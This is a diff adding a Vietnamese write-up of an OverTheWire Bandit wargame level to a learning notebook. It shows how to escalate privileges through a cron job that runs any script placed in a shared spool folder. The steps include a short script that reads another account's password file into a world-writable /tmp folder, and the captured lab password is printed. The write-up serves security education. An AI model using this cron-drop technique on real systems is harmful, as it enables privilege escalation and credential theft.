@@ -80,3 +80,38 @@
   * **Xử lý chuỗi (Text Processing):** Sức mạnh của Pipeline (`|`) trong việc kết nối các công cụ nhỏ thành một dây chuyền lớn. `md5sum` dùng để mã hóa đầu vào thành chuỗi băm duy nhất, `cut` dùng để làm sạch và bóc tách dữ liệu rác.
   * **Tính tất định của thuật toán (Deterministic Algorithm):** Cùng một đầu vào (input) truyền qua một thuật toán cố định sẽ luôn cho ra một đầu ra (output) duy nhất, bất kể ai là người thực thi lệnh đó. Đây là cơ sở để Hacker bẻ khóa hoặc mô phỏng lại các luồng dữ liệu bảo mật.
   * **Kỹ năng Debug:** Khi phân tích tĩnh (đọc mã nguồn) quá khó hiểu, hãy tiến hành phân tích động (chạy thử kịch bản) để xem dữ liệu rác/thông báo lỗi in ra. Từ đó hiểu được logic của người viết mã.
+ 
+
+## 🟢 Level 23 -> 24 
+* **Mục tiêu:** Lợi dụng lỗ hổng cấu hình của tiến trình `cron` thuộc tài khoản `bandit24`. Tiến trình này có hành vi "thực thi mù quáng" mọi tệp tin kịch bản (script) được thả vào thư mục `/var/spool/bandit24/foo`. Nhiệm vụ là tự viết một đoạn script trích xuất mật khẩu và đưa vào thư mục này để hệ thống chạy hộ.
+* **Cách giải:**
+  1. Tạo một "căn cứ ngầm" tại thư mục công cộng `/tmp/` và mở toang quyền truy cập (`777`) để hứng dữ liệu trả về:
+     ```bash
+     mkdir /tmp/kma_day21
+     chmod 777 /tmp/kma_day21
+     cd /tmp/kma_day21
+     ```
+  2. Tạo tệp tin "mã độc" `lay_pass.sh` bằng trình soạn thảo `nano` (hoặc `echo`) với nội dung ra lệnh hệ thống đọc mật khẩu của `bandit24` và đổ vào căn cứ ngầm:
+     ```bash
+     #!/bin/bash
+     cat /etc/bandit_pass/bandit24 > /tmp/kma_day21/pass24.txt
+     ```
+  3. Cấp quyền thực thi (`Execute`) cho tệp kịch bản vừa tạo:
+     ```bash
+     chmod +x lay_pass.sh
+     ```
+  4. Ném kịch bản vào bẫy và chờ đợi ít nhất 1 phút để ông quản gia `cron` của `bandit24` đi tuần ngang qua:
+     ```bash
+     cp lay_pass.sh /var/spool/bandit24/foo/
+     ```
+  5. Đọc kết quả từ tệp tin được sinh ra tại căn cứ ngầm:
+     ```bash
+     cat /tmp/kma_day21/pass24.txt
+     ```
+  6. Mật khẩu thu thập được:
+     * `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`
+
+* **Bài học cốt lõi:**
+  * **Shell Scripting cơ bản:** Biết cách khởi tạo (Shebang `#!/bin/bash`) và viết các lệnh tự động hóa đơn giản vào một tệp tin.
+  * **Insecure File Execution (Thực thi tệp tin không an toàn):** Việc hệ thống cấp quyền chạy tất cả các file trong một thư mục công cộng mà không kiểm duyệt tính toàn vẹn (Integrity) hoặc chủ sở hữu (Owner) là một lỗ hổng bảo mật chết người.
+  * **Kỷ luật chờ đợi (Timing in Exploitation):** Khi khai thác các lỗ hổng liên quan đến tiến trình ngầm (như Cron), kết quả không trả về ngay lập tức. Cần nắm rõ chu kỳ của mục tiêu để căn thời gian chính xác, tránh việc nôn nóng kiểm tra dẫn đến kết luận sai lầm về Exploit của mình.
